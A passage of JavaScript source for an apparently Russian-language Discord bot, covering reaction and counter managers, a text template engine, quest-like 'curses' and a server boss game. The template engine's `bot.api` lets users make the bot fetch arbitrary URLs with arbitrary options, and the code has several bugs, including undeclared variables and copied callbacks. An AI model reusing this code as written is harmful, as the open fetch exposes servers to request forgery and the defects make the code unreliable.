  }

  static async handle(){
    let reactions = [];
    const data = await ReactionsManager.readFile();
    data.asyncForEach(async e => {
      try {
        let message = await client.guilds.cache.get(e.guild).channels.cache.get(e.channel).messages.fetch(e.id);
        if (!message.id) throw new Error("failed to find message");
        return reactions.push(e);
      }
      catch (e){ return console.error(e) }
    })
    fs.writeFileSync("./main/reactData.json", JSON.stringify(reactions), (err, input) => false);
    ReactionsManager.reactData = ReactionsManager.getMain();
  }
  
  static async loadReactionsFromFile(){
    ReactionsManager.reactData = await ReactionsManager.getMain();
  }
}


class CounterManager {
  constructor (channel, guild, type, template, args){
    let counter = {channel, guild, type, template, args};

    CounterManager.counterData.push(counter);
    CounterManager.writeFile();
    CounterManager.counterData = CounterManager.readFile();
    CounterManager.up(counter);
    return counter;
  }

  static counterData = [];

  static async readFile(){
    const { default: data } = await import("./main/counterData.json", {assert: {type: "json"}});
    return data;
  }

  static writeFile(){
    fs.writeFileSync("./main/counterData.json", JSON.stringify(CounterManager.counterData), (err, input) => false);
  }

  static async clearSuperfluous(){
    let counters = [];
    const data = await CounterManager.readFile();
    data.asyncForEach(async e => {
      try {
        let channel = client.guilds.cache.get(e.guild).channels.cache.get(e.channel);
        if (!channel.id) throw new Error("failed to find channel");
        if (e.type == "message") {
          let message = await channel.messages.fetch(e.args);
          if (!message.id) throw new Error("failed to find message");
        }
        return counters.push(e);
      }
      catch (err){ return console.error(err.message) }
    })
    CounterManager.writeFile();
    CounterManager.counterData = await CounterManager.readFile();
    CounterManager.handle();
  }

  static delete(counterOrIndex){
    let index = (typeof counterOrIndex == "number") ? counterOrIndex : CounterManager.counterData.indexOf(counterOrIndex);
    if (index == -1) return false;

    CounterManager.counterData.splice(index, 1);
    CounterManager.writeFile();
  }

  static async handle(){
    let i = 0;
    while (true) {
      let counter = CounterManager.counterData[i];
      CounterManager.up(counter);
      await delay(900000 / (CounterManager.counterData.length + 1));
      i++;
      i %= CounterManager.counterData.length;
    }
  }

  static async up(counter){
    if (!counter){
        return;
    }

    try {
      let channel = client.guilds.cache.get(counter.guild).channels.cache.get(counter.channel);
      let value = await template(counter.template, channel);
      switch (counter.type) {
        case "message":
          let message = await channel.messages.fetch(counter.args);
          if (message instanceof Map) throw new Error("Unknown message");
          if (message.embeds[0]) message.edit("", message.embeds[0].setDescription(value));
          else await message.msg(value, {edit: true, embed: true})
        break;
        case "channel": await channel.setName(value, "15m Counter");
        break;
        case "poster": await channel.msg(value, {embed: true});
        break;
      }
    }
    catch (e) {
      if (e.message != "obj.send is not a function") {
        console.error(e);
      }
      CounterManager.delete(counter);
    }
    return;
  }

  static async loadCountersFromFile(){
    CounterManager.counterData = await CounterManager.readFile();
  }
}


class Template {
  constructor (input, base, options = {}, forceDestroy){
    if (typeof input == "object" || forceDestroy) return input;
    input = String(input);

    this.input   = input;
    this.base    = base;
    this.options = options;
    this.list    = this.findTemplates(input);

    return this.promise();
  }

  findTemplates(){
    let input = this.input;
    let nesting = [], e;
    let finded = [];
    for (let i = 0; i < input.length; i++){
      let find = ["!", "$", "?"].find(e => e == input[i]);
      if (find && input[++i] == "{" && input[i - 2] != "\\") {
        let reg = {
          pos: 1 + i,
          type: find,
          category: find,
          _others: [],
          _parent: null,
          template: this,
        };
        nesting.push(reg);
      }
      else if (input[i] == "{") nesting.push({category: null});

      if (input[i] == "}" && nesting[0]){
          let regular = nesting.pop();
          regular.reg = input.substring(regular.pos, i);
          if (regular.category === null || !regular.reg) continue;

          if (nesting[0]) nesting.last._others.push(regular);
          regular._others.forEach(e => e._parent = regular);
          finded.push(regular);
      }
    }
    return finded;
  }

  async promise(){
    await this.handleVariableField();
    while (this.list[0]) this.input = await this.handle(this.list.last);
    return this.input;
  }

  async handle(regular){
    let value = await this.getRegular(regular);
    return this.input.substring(0, regular.pos - 2) + value + this.input.slice(regular.pos + regular.original.length + 1);
  }

  async isCondition(regular){
    if (regular.category != "?") return;
    let condition = regular._others.shift();
    regular.reg = regular.reg.slice(condition.pos + condition.reg.length - 3);

    let side = regular.reg.split(/(?<!\\)\:/).map(e => e.replace("\\:", ":"));
    side.splice(1, Infinity, side.slice(1).join(":"));

    let isTrue = await this.getRegular(condition);
    isTrue = isTrue && !["0", "false", "[шаблон Шаблон]", "[шаблон Фунция]", "[ошибка Шаблона]"].includes( String(isTrue) );
    regular.reg = side[+!isTrue];
    let length = condition.pos + condition.reg.length + side[0].length;
    regular._others.filter(e => isTrue ? e.pos > length : e.pos < length).forEach(e => matchAll.splice(matchAll.indexOf(e), 1) && regular._others.splice(regular._others.indexOf(e), 1));
    // regular._others.forEach(e => e.pos -= 3 - isTrue + (condition.pos + condition.reg.length - regular.pos - 1) + (isTrue ? 0 : side[0].length));
  }

  async handleVariableField(){
    let regular = this.list.find(e => e.category == "$");
    if (!regular) return;

    regular.original = regular.reg;
    let variables = regular._others;
    let processed = [];
    while (variables[0]) regular.reg = await this.handle(variables.pop());

    variables = regular.reg.split(/(?<!\\)\,/).map(e => e.replace("\\,", ",").split("="));
    variables.forEach(e => this.options[e[0].trim()] = e.slice(1).join("=").trim());

    this.list.filter(e => e.pos > regular.pos).forEach(e => e.pos -= regular.original.length + 3);
    this.list.splice(this.list.indexOf(regular), 1);

    this.input = this.input.substring(0, regular.pos - 2) + this.input.slice(regular.pos + regular.original.length + 1);
  }

  async getRegular(regular){
    this.list.splice(this.list.indexOf(regular), 1);
    regular.original = regular.reg;
    await this.isCondition(regular);

    let value;
    while (regular._others[0]) regular.reg = await this.handle(regular._others.pop());

    if (regular.category == "?") return regular.reg;
    value = await this.getFromScope(regular);
    if (value instanceof Promise) value = await value;
    return value;
  }

  async getFromScope(regular){
    let func;
    let base = regular.template.base;

    let way = regular.reg.match(/(?:[^.]+?\(.+?\))($|(?=\.))|([a-z0-9]+)(?!=[(])/gim);
    if (!way) return `\\!{${regular.reg}}`;

    let scope = await this.openScope(regular);
    let last = scope;

    try {
    // if
      for (let i = 0; i < way.length; i++) {
        regular.args = null;
        if (typeof last == "function"){
          // function
          args = way[i].match(/\(.+?\)/);
          if (!args) {
            base.msg("Шаблон функция", {description: `Свойство \`${way[i]}\` - функция()\nScope:/${way.slice(0, i + 1).join(" -> ")}\nПовторите попытку указав аргумент: \`${scope.false_func}\``});
            return "[шаблон Фунция]";
          }
          regular.args = way[i].slice(args.index + 1, -1).split(/(?<!\\)\,/).map(e => e.replace("\\,", ",").trim());
          way[i] = way[i].slice(0, func.index);
        }
        scope = await scope[way[i]];
        if (scope === undefined && !regular.args) scope = this.options[way[i]];

        if (scope === undefined) {
          if (typeof last == "object" && last instanceof Array == false) base.msg("Шаблон 404", {description: "В вашем шаблоне не найдено свойство `" + way[i] + "` по пути: \nScope:/" + way.slice(0, i + 1).join(" -> ") + "\nДоступные свойства: `" + ((Object.keys(last).length < 10) ? (Object.keys(last).join("`/`")) : (Object.keys(last).slice(0, 7).join("`/`") + "``/..."))  + "`"});
          else base.msg("Шаблон 404", {description: `В вашем шаблоне возникла ошибка: по пути:\n${way.slice(0, i + 1).join(" -> ")}\nЗначение ${last} не имеет свойств.`, delete: 20000});
          return "[шаблон Шаблон]";
        }

        if (scope.false_func) {

        }
        last = scope;
      }

      if (typeof scope == "object"){
        Object.assign(this.options, scope);
        base.msg("Свойство `" + way.last + "` — объект, для получения примитивных значений попробуйте обратиться к его свойствам", {description: "Доступные свойства: `" + ((Object.keys(scope).length < 20) ? (Object.keys(scope).join("`/`")) : (Object.keys(scope).slice(0, 15).join("`/`") + "``/...")) + "`"});
        return `[шаблон Объект(${Object.keys(scope).length})]`
      }

      if (scope.length > 99) return "[шаблон Превышен лимит]";

      return scope;

    } catch (e) {
      base.msg("В шаблоне произошла ошибка", {description: e.message});
      console.error("Внутришаблонная ошибка");
      console.error(e);
      return "[ошибка Шаблона]";
    }
  }

  async openScope(regular){
    let
      base = regular.template.base,
      args = regular.args;

    let object = {
       guild: {
          stats: {
            get msgs() {
              return base.guild.data.day_msg;
            },
            get averageTotal(){
              return Math.round(base.guild.data.msg_total / base.guild.data.days) || base.guild.data.day_msg;
            },
            get msgsTotal(){
              return base.guild.data.msg_total;
            }
          },
          emojis: {
            get random() {
              return base.guild.emojis.cache.random().toString();
            },
            get get(){
              if (!args) return {false_func: "emojiId"};
              let emoji = base.guild.emojis.cache.get(args[0]);
              if (emoji) return emoji.toString();
              else throw "Invalid EmojiId";
            }
          },
          variables: {
            get set(){
              if (!args) return {false_func: "{userId} {variable} {value}"};
              if (args[0] != "server" && !args[0].match(/\d{17,19}/g)) throw "Аругментом userId введено не айди пользователя";
              if (base.guild.member(base.author).wastedPermissions(288)[1]) throw "Недостаточно прав для изменения переменных сервера";
              let guild = getData(base.guild.id, "guilds");
              let variables = guild.variables || (guild.variables = {});

              let name = variables[args[0]] || (variables[args[0]] = {});
              let save = args[2].slice(1);
              if (args[2][0] == "+") args[2] = +name[args[1]] + +args[2].slice(1);
              if (args[2][0] == "-") args[2] = +name[args[1]] - +args[2].slice(1);
              if (isNaN(args[2])) args[2] = save;

              name[args[1]] = args[2];
              return args[2];
            },
            get read(){
              if (!args) return {false_func: "{userId} {variable}"};
              if (base.guild.member(base.author).wastedPermissions(288)[1]) throw "Недостаточно прав для изменения переменных сервера";
              if (args != "server" && !args.match(/\d{6,9}/g)[0]) throw "Аругментом userId введено не айди пользователя";
              let guild = getData(base.guild.id, "guilds");
              let variables = guild.variables || (guild.variables = {});

              let name = variables[args[0]] || (variables[args[0]] = {});
              return (name[args[1]] === undefined) ? "пустота" : name[args[1]];
            }
          }
        },
       bot: {
          get api() {
              if (!args) return {false_func: "{link} <options>"};
              console.info("API " + args);
              let options = {method: "GET"};

              if (args[2]) {
                try { options = JSON.parse(args.slice(1).join(",")); }
                catch (e) { throw new Error("Неверно указаны опции, они должы быть в JSON формате"); }
              }
              console.info(options);
              let response = fetch(args[0], options).then(e => e.text().then(read => {
                try {
                  res = {status: e.status, statusText: e.statusText};
                  read = JSON.parse(read);
                }
                catch (e) {}
                finally {
                  res.read = read;
                }
                return res;
              }));
              return response;
          },
          stats: {
            get averageAll(){
              let guilds = data.guilds.filter(e => e.days);
              let size = guilds.length;
              return Math.round(guilds.reduce((last, e) => last + e.msg_total / e.days, 0) / size);
            },
            get averageToday(){
              let guilds = data.guilds.filter(e => e.day_msg);
              let size = guilds.length;
              return Math.round(guilds.reduce((last, e) => last + e.day_msg, 0) / (size || 1));
            },
            get msgsTotal(){
              let guilds = data.guilds.filter(e => e.msg_total);
              return guilds.reduce((last, e) => last + e.msg_total, 0);
            },
            get msgsToday(){
              let guilds = data.guilds.filter(e => e.day_msg);
              return guilds.reduce((last, e) => last + e.day_msg, 0);
            },
            get commandsLaunched(){
              let guilds = data.guilds.filter(e => e.commandsLaunched);
              return guilds.reduce((last, e) => last + e.commandsLaunched, 0);
            }
          },
          methods: {
            get random(){
              if (!args) return {false_func: "{number or string}"};
              if (args[1]) return args.random();
              return random(+args);
            },
            get ending(){
              if (!args) return {false_func: "{num} {word} {0, 5-9} {1} {2-4}"};
              return ending(...args)
            },
            get math(){
              if (!args) return {false_func: "{math regular}"};
              return Math.math(args.join());
            }
          },
          logical: {
            get IfEqual(){
                if (!args) return {false_func: "{oneValue} {twoValue}"};
                if (args[0] == args[1]) return 1;
                else return 0;
            },
            get IfLessZero(){
                if (!args) return {false_func: "{number}"};
                if (isNan(args[0])) throw "number is Not a Number";
                if (args[0] < 0) return 1;
                else return 0;
            }
          },
          other: {
            time: {
              get hours(){
                return new Date().getHours();
              },
              get minutes(){
                return new Date().getMinutes();
              },
              get displayDate(){
                return data.bot.dayDate;
              },
              get display(){
                let date = new Date();
                return `${("0" + date.getHours()).slice(-2)}:${("0" + date.getMinutes()).slice(-2)}`;
              }
            }
          }
        },
       get msg() {
         return base;
       },
       variables: regular.template.options,
       get trash(){
         // if (!args) return {false_func: "Введите аргументы для их удаления"}
         return "";
       },
       get var(){
         if (!args) return {false_func: "{variable} {value}"};
         if (args[1]) openScope.variables[args[0]] = args.slice(1).join(" ");
         return openScope.variables[args[0]];
       }
    };
    return object;
  }

  shortPrototype(type){
    let shorted = {};
    let [prototype, whiteList] = {
      "Array": [
        Array.prototype,
        ["first", "last", "getRandom", "length", "concat"]
      ],
      "Object": [
        Object.prototype,
        []
      ],
      "String": [
        String.prototype,
        ["length", "split"]
      ]
    }[type];
    if (!prototype) {
      console.error(`\n\n\nНе опознанный класс ${type}\n\n\n`);
      return {};
    }

    whiteList.forEach(e => (e in prototype) ? shorted[e] = prototype[e] : false);
    return shorted;
  }
}


class GuildVariablesManager {
  constructor (guildId) {
    let guild = getData(guildId, "guilds");
    this.variables = guild.variables || (guild.variables = {});
    return this;
  }
  setGuild (name, value){
    if (value.trim.match(/^(?:\+|\-)\d+$/)){
      value = (this.variables.guild[name] || 0) + value;
    }

    return this.variables.guild[name] = value;
  }

  getGuild(name){
    return this.variables.guild[name];
  }

  set (id, name, value = "0"){
    if (name.match(/[^a-zа-яїё_$]/i)){
      // Нежелательные символы
      return {err: 1};
    }
    this.variables[id] || (this.variables[id] = {});

    if (!this.variables[id][name] && Object.keys(this.variables[id]) >= 19){
      // Превышен лимит
      return {err: 2};
    }



    if (value.trim().match(/^(?:\+|\-)\d+$/)){
      value = (this.variables[id][name] || 0) + value;
    }
    this.variables[id][name] = value;
    return {id, name, value};
  }

  get (id, name){
    if (!this.variables[id]){
      return {id, name, value: "[пусто]"};
    }

    let value = this.variables[id][name];
    value = value === undefined ? "[пусто]" : value;
    return {id, name, value};
  }

  list () {
    let list = {};
    this.toArray.map(e => e.values).forEach(e => e.forEach(([name, value]) => name in list ? list[name]++ : list[name] = 1));
    return list;
  }

  top (name) {
    let list = this.toArray.map(e => [e.id, e.values.find(([k, v]) => k == name)]).filter(e => e[1]);
    return list.sortBy("1");
  }

  search (name) {
    let list = {};
    this.toArray.forEach(e => e.values.some(([k, value]) => k == name ? list[e.id] = value : false));
    return list;
  }

  remove (name, id = false) {
    if (id) {
      return delete this.variables[id][name];
    }
    let counter = 0;
    this.toArray.forEach(e => e.values.some(([k]) => k == name ? (counter++, delete this.variables[e.id][k]) : false));
    return counter;
  }

  get toArray() {
    return Object.entries(this.variables).map(([key, value]) => ({id: key, values: Object.entries(value)}));
  }
}


class CurseManager {

  static generate({hard = null, user}){
  	if (hard > 2){
  	  throw new RangeError("Maximal of curse hard is 2");
      }

    const curseBase = [...CurseManager.cursesBase.values()]
      .filter(curseBase => hard === null || curseBase.hard === hard)
      .filter(curseBase => !curseBase.filter || curseBase.filter(user))
      .random({weights: true});


    const curse = this.generateOfBase({user, curseBase});


    return curse;
  }

  static generateOfBase({curseBase, user}){
    const curse = {
      id: curseBase.id,
      values: {},
      timestamp: Date.now()
    }


    Object.entries(curseBase.values)
      .forEach(([key, callback]) => curse.values[key] = callback(user, curse));

    return curse;
  }

  static init({curse, user}){
    if (!user.data.curses){
      user.data.curses = [];
    }

    user.data.curses.push(curse);


    if (curse.values.timer){
      const args = [user.id, curse.timestamp];
      new TimeEvent("curseTimeoutEnd", curse.values.timer, ...args);
    }

    user.action("curseInit", {curse});
  }


  static cursesBase = new Collection(
    [
      {
        _weight: 10,
        id: "callUserCommand",
        description: "Используйте команду !юзер <:piggeorg:758711403027759106>",
        hard: 0,
        values: {
          goal: () => random(1, 5),
          timer: () => random(1, 3) * 86_400_000
        },
        callback: {
          callUserCommand: (user, curse) => CurseManager.intarface({user, curse})
            .incrementProgress(1)
        },
        reward: 4
      },
      {
        _weight: 10,
        id: "onlyBuyBerry",
        description: "Купите клубнику, не продав ни одной",
        hard: 0,
        values: {
          goal: () => random(5, 20),
          timer: () => random(1, 2) * 86_400_000
        },
        callback: {
          berryBarter: (user, curse, {quantity, isBuying}) => {
            isBuying === 1 ?
              CurseManager.intarface({user, curse}).incrementProgress(quantity) :
              CurseManager.intarface({user, curse}).fail();
          }
        },
        reward: 12
      },
      {
        _weight: 7,
        id: "weekdaysQuest",
        description: "Не пропускайте выполнение ежедневного квеста",
        hard: 2,
        values: {
          goal: () => random(3, 5),
          timer: (user, curse) => {
            const now = new Date();
            const adding = curse.values.goal;
            const timestamp = new Date(now.getFullYear(), now.getMonth(), now.getDate() + adding).getTime();
            return Math.floor(timestamp - now);
          }
        },
        callback: {
          curseInit: (user, curse, data) => data.curse === curse &&
            user.data.questProgress >= user.data.questNeed ?
              CurseManager.intarface({user, curse}).incrementProgress(1) :
              null,

          dailyQuestCompete: (user, curse) => CurseManager.intarface({user, curse}).incrementProgress(1),
          dailyQuestSkiped:  (user, curse) => CurseManager.intarface({user, curse}).fail()
        },
        reward: 16
      },
      {
        _weight: 10,
        id: "notStupid",
        description: "Выполните ваш ежедневный квест, не называя бота глупым",
        hard: 1,
        values: {
          goal: () => 1,
          timer: (user, curse) => {
            const now = new Date();
            const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1).getTime();
            return Math.floor(tomorrow - now);
          }
        },
        callback: {
          dailyQuestCompete: (user, curse) => CurseManager.intarface({user, curse}).incrementProgress(1),
          callBotStupid:     (user, curse) => CurseManager.intarface({user, curse}).fail()
        },
        filter: (user) => user.data.quest === "namebot",
        reward: 4
      },
      {
        _weight: 10,
        id: "chilliChampion",
        description: "Победите в мини-игре с перцем",
        hard: 0,
        values: {
          goal: () => 2,
          timer: () => 86_400_000 * 2
        },
        callback: {
          chilliBooh: (user, curse, {boohIn}) => boohIn !== user ?
            CurseManager.intarface({user, curse}).incrementProgress(1) :
            null,
        },
        reward: 4
      },
      {
        _weight: 10,
        id: "chilliImperator",
        description: "Победите в мини-игре с перцем. Нельзя проигрывать",
        hard: 0,
        values: {
          goal: () => 1,
          timer: (user, curse) => {
            const now = new Date();
            const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1).getTime();
            return Math.floor(tomorrow - now);
          }
        },
        callback: {
          chilliBooh: (user, curse, {boohIn}) => boohIn !== user ?
            CurseManager.intarface({user, curse}).incrementProgress(1) :
            CurseManager.intarface({user, curse}).fail(),
        },
        reward: 7
      },
      {
        _weight: 10,
        id: "usefulChest",
        description: "В сундуке, который Вы откроете должна оказаться нестабильность",
        hard: 1,
        values: {
          goal: () => 1,
          timer: () => 86_400_000 * 10
        },
        callback: {
          openChest: (user, curse, {treasures}) => "void" in treasures ?
            CurseManager.intarface({user, curse}).incrementProgress(1) :
            null,

        },
        reward: 15
      },
      {
        _weight: 10,
        id: "sonic",
        description: "Отправьте 70 сообщний за минуту",
        hard: 1,
        values: {
          goal: () => 70,
          timer: () => 3_600_000 * 2,
          messages: () => []
        },
        callback: {
          message: (user, curse) => {
            const now = Date.now();
            const messages = curse.values.messages;

            messages.push( now );

            const extraTimeForMobileUsers = 5_500 * ("mobile" in (user.presence.clientStatus || {}));
            const TIMEOUT = 90_000 + extraTimeForMobileUsers;

            while (messages[0] + TIMEOUT < now){
              messages.shift();
            }

            CurseManager.intarface({user, curse}).setProgress(messages.length);
          }
        },
        reward: 4
      },
      {
        _weight: 1,
        id: "mentionForDistribute",
        description: "Упомяните двух человек, у которых нет, и не было сего, проклятия. Проклятие распространяется на каждого, кого вы упомянули",
        hard: 0,
        values: {
          goal: () => 2,
          timer: () => 86_400_000 / 2,
          listOfUsers: (user) => [user.id]
        },
        callback: {
          message: (user, curse, message) => {
            const content = message.content;
            const mentions = content.matchAll(Discord.MessageMentions.USERS_PATTERN)
              .next()
              .value;


            if (!mentions){
              return;
            }

            const target = client.users.cache.get(mentions[1]);
            if (target.id === user.id || target.bot){
              return;
            }

            if (!user.curses){
              user.curses = [];
            }
            const haveCurse = user.data.curses.length;
            if (haveCurse && user.data.voidFreedomCurse){
              return;
            }


            const list = curse.values.listOfUsers || [];

            if (list.includes(target.id)){
              message.react("❌");
              return; 
            }

            message.react("💀");

            const curseBase = this.cursesBase.get( curse.id );
            const createdCurse = this.generateOfBase({curseBase, user: target});

            

            this.init({curse: createdCurse, user: target});
            list.push(target.id);
            createdCurse.values.listOfUsers = list;

            CurseManager.intarface({user, curse}).incrementProgress(1);
          }
        },
        reward: 1
      },
      {
        _weight: 5,
        id: "coinFever",
        description: "Отправьте коин-сообщения или дождитесь окончания. Даёт дополнительный шанс в 16% получить коин из сообщения. Однако количество денег будет уменьшаться",
        hard: 0,
        values: {
          goal: (user) => 48 - nonNaN(user.data.chectLevel) * 16,
          timer: () => 3_600_000 / 2
        },
        callback: {
          message: (user, curse, message) => {
            if (random(6)){
              return;
            }

            const data = user.data;

            const previousCoins = data.coins;
            getCoinsFromMessage(data, message);
            const difference = data.coins - previousCoins;

            data.coins -= difference * 2;
            CurseManager.intarface({user, curse}).incrementProgress(1);
          },
          curseTimeEnd: (user, curse, data) => {
            if (data.curse !== curse){
              return;
            }

            const goal = curse.values.goal;
            data.event.preventDefault();

            CurseManager.intarface({user, curse}).setProgress(goal);
          }
        },
        reward: 7
      },
      {
        _weight: 5,
        id: "bossWannaDamage",
        description: "Нанесите боссу вот столько-вот урона",
        hard: 2,
        values: {
          goal: (user) => 100_000,
          timer: (user) => {
            const guilds = user.guilds.filter(guild => guild.data.boss?.isArrived);
            const guild = guilds.reduce((maximalize, guild) => maximalize.data.boss.endingAtDay < guild.data.boss.endingAtDay ? guild : maximalize);
          }
        },
        callback: {
          message: (user, curse, message) => {
            if (random(6)){
              return;
            }

            const data = user.data;

            const previousCoins = data.coins;
            getCoinsFromMessage(data, message);
            const difference = data.coins - previousCoins;

            data.coins -= difference * 2;
            CurseManager.intarface({user, curse}).incrementProgress(1);
          },
          curseTimeEnd: (user, curse, data) => {
            if (data.curse !== curse){
              return;
            }

            const goal = curse.values.goal;
            data.event.preventDefault();

            CurseManager.intarface({user, curse}).setProgress(goal);
          }
        },
        reward: 15
      }
    ]
    .map(curse => [curse.id, curse])
  );

  static intarface({curse, user}){

    const incrementProgress = (value) => {
      curse.values.progress = (curse.values.progress || 0) + value;
      CurseManager.checkAvailable({curse, user});
      return curse.values.progress;
    };

    const setProgress = (value) => {
      curse.values.progress = value;
      CurseManager.checkAvailable({curse, user});
      return curse.values.progress;
    }

    const toString = () => {
      const curseBase = CurseManager.cursesBase.get(curse.id);

      const description = curseBase.description;
      const progress = `Прогресс: ${ curse.values.progress || 0 }/${ curse.values.goal }`;
      const timer = curse.values.timer ? `\nТаймер: <t:${ Math.floor((curse.timestamp + curse.values.timer) / 1000) }:R> будет провалено` : "";

      const content = `${ description }\n${ progress }${ timer }`;
      return content;
    }

    const fail = () => {
      CurseManager.curseEnd({lost: true, user});
    }

    return {
      incrementProgress,
      setProgress,
      toString,
      fail
    }
  }

  static checkAvailable({curse, user}){

    if (!curse){
      return null;
    }
    
    if (curse.values.progress >= curse.values.goal){
      CurseManager.curseEnd({user, curse, lost: false});
    }

    if (curse.values.timer && Date.now() > curse.timestamp + curse.values.timer){
      const event = new Event("curseTimeEnd", {cancelable: true});
      user.action("curseTimeEnd", {event, curse});
      if (!event.defaultPrevented){
        CurseManager.curseEnd({user, curse, lost: true});
      }
    }
  }

  static checkAvailableAll(user){
    user.data.curses.forEach(
      (curse) => this.checkAvailable({curse, user})
    );
  }

  static curseEnd({lost, user, curse}){
    const curseBase = CurseManager.cursesBase.get(curse.id);

    const index = user.data.curses.indexOf(curse);
    if (index === -1){
      return null;
    }

    user.data.curses.splice(index, 1);

    const getDefaultFields = () => {
      const fields = [];
      fields.push({
        name: "Прогресс:",
        value: Object.entries(curse.values)
            .map(([key, value]) => `${ key }: \`${ Util.toLocaleDelevoperString(value) }\``)
            .join("\n")

      });

      fields.push({
        name: "Основа:",
        value: Object.entries(curseBase)
            .map(([key, value]) => `${ key }: \`${ Util.toLocaleDelevoperString(value) }\``)
            .join("\n")

      });

      fields.push({
        name: "Другое:",
        value: `Дата создания: <t:${ Math.floor(curse.timestamp / 1000) }>`

      });

      fields
        .filter(field => field.value.length > 1024)
        .forEach(field => field.value = `${ field.value.slice(0, 1021) }...`);

      return fields;
    }

    if (lost){
      user.data.level = Math.max(1, user.data.level - 1);
      const fields = getDefaultFields();
      const image = "https://media.discordapp.net/attachments/629546680840093696/1014076170364534805/penguinwalk.gif";
      user.msg("Вы не смогли его одолеть 💀", {description: "Проклятие не было остановлено, а последствия необратимы. Вы теряете один уровень и, возможно, что-то ещё.", fields, color: "000000", image});
      return;
    }



    if (!lost){
      user.data.cursesEnded = nonNaN(user.data.cursesEnded) + 1;
      const fields = getDefaultFields();

      const getVoidReward = () => {
        const BASIC_ODDS = 20;
        const REDUCTION_FOR_HARD = 0.25;
        const comparator = BASIC_ODDS * REDUCTION_FOR_HARD ** curseBase.hard;

        return Number(Math.random() < 1 / comparator);
      };
      const voidReward = getVoidReward();

      const getCoinsReward = () => {
        const BASIC_REWARD = 200;
        const ADDING_REWARD = 115;
        return (BASIC_REWARD + ADDING_REWARD * curseBase.hard) * curseBase.reward;
      }
      const coinsReward = getCoinsReward();

      user.data.coins += coinsReward;
      user.data.void += voidReward;

      const rewardContent = `${ ending(coinsReward, "коин", "ов", "", "а") }${ voidReward ? ` и ${ ending(voidReward, "нестабильност", "и", "ь", "и") }` : "" }`;
      const descriptionFooter = `${ coinsReward ? "<:coin:637533074879414272>" : "" } ${ voidReward ? "<a:void:768047066890895360>" : "" }`;
      const description = `Это ${ user.data.cursesEnded }-й раз, когда Вам удаётся преодолеть условия созданные нашей машиной для генерации проклятий.\nВ этот раз вы получаете: ${ rewardContent }. Награда такая незначительная в связи с тем, что основным поставщиком ресурсов является сундук. Да будь он проклят!\n${ descriptionFooter }`;

      const image = "https://media.discordapp.net/attachments/629546680840093696/1014076170364534805/penguinwalk.gif";

      user.msg("Проклятие снято 🔆", {description, fields, color: "000000", image});
      return;
    }
  }

}


class BossManager {
  static async bossApparance(guild){

    const TWO_MONTH = 5259600000;

    if ( guild.me.joinedTimestamp > getTime() + TWO_MONTH )
      return;

    const guildData = guild.data;
    const now = new Date();

    const generateEndDate = () => {
      const days = data.bot.currentDay;
      guildData.boss.endingAtDay = days + 3;
    }

    const generateNextApparance = () => {

      // the boss cannot spawn on other days
      const MIN = 1;
      const MAX = 28;
      const date = new Date(now.getFullYear(), now.getMonth() + 1, random(MIN, MAX));
      const days =  Math.floor(date.getTime() / 86_400_000);
      guildData.boss.apparanceAtDay = days;
    }



    if (!guildData.boss){

      guildData.boss = {};
      generateNextApparance();
    }

    if (guildData.boss.endingAtDay <= data.bot.currentDay){
      await BossManager.beforeEnd(guild);
      delete guildData.boss;
      return;
    }

    if (guildData.boss.apparanceAtDay  <= data.bot.currentDay){
      generateEndDate();
      delete guildData.boss.apparanceDate;

      BossManager.initBossData(guildData.boss, guild);
    }



  }

  static getUserStats(boss, id){
    if (typeof id !== "string"){
      throw new TypeError("Expected id");
    }

    const bossUsers = boss.users;
    if (id in bossUsers === false)
      bossUsers[id] = { messages: 0 };

    return bossUsers[id];
  }

  static onMessage(message){
    const boss = message.guild.data.boss;
    const authorId = message.author.id;

    const userStats = this.getUserStats(boss, authorId);
    userStats.messages++;

    const DEFAULT_DAMAGE = 1;
    const damage = userStats.damagePerMessage ?? DEFAULT_DAMAGE;
    BossManager.makeDamage(boss, damage, {sourceUser: message.author});
  }

  static calculateHealthPoint(level){
    return 7_000 + Math.floor(level * 500 * 1.2 ** level);
  }

  static calculateHealthPointThresholder(level){
    const totalOfPrevious = [...new Array(level - 1)]
      .map((_, level) => BossManager.calculateHealthPoint(level))
      .reduce((acc, points) => acc + points, 0);

    return BossManager.calculateHealthPoint(level) + totalOfPrevious;
  }


  static makeDamage(boss, damage, {sourceUser} = {}){
    damage *= (boss.diceDamageMultiplayer ?? 1);
    damage = Math.floor(damage);

    boss.damageTaken += damage;

    if (sourceUser){
      const stats = BossManager.getUserStats(boss, sourceUser.id);
      stats.damageDealt ||= 0;
      stats.damageDealt += damage;
    }

    if (boss.damageTaken >= boss.healthThresholder){
      BossManager.kill({boss, sourceUser})
    }
  }

  static kill({boss, sourceUser}){
    const expReward = 500 + 500 * boss.level;
      const mainContent = sourceUser ? `${ sourceUser.username } наносит пронзающий удар и получает ${ expReward } <:crys2:763767958559391795>` : "Пронзительный удар из ни откуда нанёс критический для босса урон";
      if (sourceUser){
        sourceUser.data.exp += expReward;
      }
      
      const guild = client.guilds.cache.get(boss.guildId);
      const footer = {text: "Образ переходит в новую стадию", iconURL: sourceUser ? sourceUser.avatarURL() : guild.iconURL()};
      guild.chatSend({message: "", description: `Слишком просто! Следующий!\n${ mainContent }`, footer});
      BossManager.createBonusesChest({guild, boss, thatLevel: boss.level});
      boss.level++;
      boss.healthThresholder = BossManager.calculateHealthPointThresholder(boss.level);

      Object.values(boss.users)
        .forEach(userStats => delete userStats.attack_CD);
  }

  static async createBonusesChest({guild, boss, thatLevel}){
    const color = "ffda73";
    const embed = {
      message: "Сундук с наградами",
      description: `Получите бонусы за победу над боссом ур. ${ thatLevel }.\nВремя ограничено двумя часами с момента отправки этого сообщения.`,
      thumbnail: "https://media.discordapp.net/attachments/629546680840093696/1038767024643522600/1476613756146739089.png?width=593&height=593",
      color,
      reactions: ["637533074879414272"]
    };

    const calculateReward = (level) => 120 + level * 10;

    const message = await guild.chatSend(embed);
    const collector = message.createReactionCollector((reaction) => !reaction.me, {time: 3_600_000 * 2});
    collector.on("collect", (_reaction, user) => {
      const userStats = BossManager.getUserStats(boss, user.id);
      userStats.bonuses ||= {};
 
      if ("chestReward" in userStats){
        message.msg(`Вы уже взяли награду на ур. ${ userStats.chestReward }`, {delete: 5000});
        return;
      };

      const reward = calculateReward(thatLevel);
      userStats.chestReward = thatLevel;
      user.data.chestBonus = (user.data.chestBonus ?? 0) + reward;
      message.msg({message: "", description: `Получено ${ ending(reward, "бонус", "ов", "", "а") } для сундука <a:chest:805405279326961684>`, color, delete: 7000});
    })

